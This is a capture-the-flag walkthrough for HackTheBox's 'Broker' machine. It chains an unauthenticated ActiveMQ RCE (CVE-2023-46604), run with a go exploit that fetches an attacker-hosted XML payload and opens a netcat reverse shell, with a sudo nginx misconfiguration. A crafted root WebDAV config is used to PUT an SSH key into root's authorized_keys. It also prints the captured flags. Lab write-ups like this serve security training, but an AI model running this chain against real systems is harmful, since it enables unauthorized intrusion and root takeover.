### 2024-04-23-Tue

[Broker | HackTheBox](https://app.hackthebox.com/machines/Broker)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/6239ac7a-aab3-43af-8fd8-8540469abacc)

# About Broker

Broker is an easy difficulty `Linux` machine hosting a version of `Apache ActiveMQ`. 
Enumerating the version of `Apache ActiveMQ` shows that it is vulnerable to `Unauthenticated Remote Code Execution`, 
which is leveraged to gain user access on the target. 
Post-exploitation enumeration reveals that the system has a `sudo` misconfiguration allowing the `activemq` user to execute `sudo /usr/sbin/nginx`, 
which is similar to the recent `Zimbra` disclosure and is leveraged to gain `root` access. 

https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ

```
go run main.go -i 10.129.230.87 -p 61616 -u http://10.10.14.25:8001/poc-linux.xml
```

```
python3 -m http.server 8001 & nc -lnvp 4444
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/2ab3e2f5-a0a7-41d9-8a1d-d80f913dd7b4)

```
e8d4f2eca970362e9afee7788d49d563
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/a2b0a477-ced7-4b59-8804-06656f39dfd5)

```
find / -name nginx 2>/dev/null
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/e23bad1c-4ce8-430e-bc91-453ae80ec48b)

```
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events{
		worker_connections 768;
}
http{
	server{
		listen 1337;
		root /;
		autoindex on;
		
		dav_methods PUT;
	}
}
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/c55eb806-0609-489a-96b2-67d4f78c5fa9)

```
sudo nginx -c /tmp/pwn.conf
```

```
ss -tlnp
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/a5752895-4ebf-4094-a2b5-b872432cb817)

```
ssh-keygen
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/bb933126-6c18-490e-89c2-c91356f8aeea)

```
curl -X PUT localhost:1337/root/.ssh/authorized_keys -d "$(cat root.pub)"
```

```
ssh -i root root@localhost
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/5db1ac53-172d-4fba-8c10-7a3a83b4f7c9)

```
4b58e81e41751342d0af697622b260ff
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/be5940ae-30a5-454b-a1b2-38532c904814)

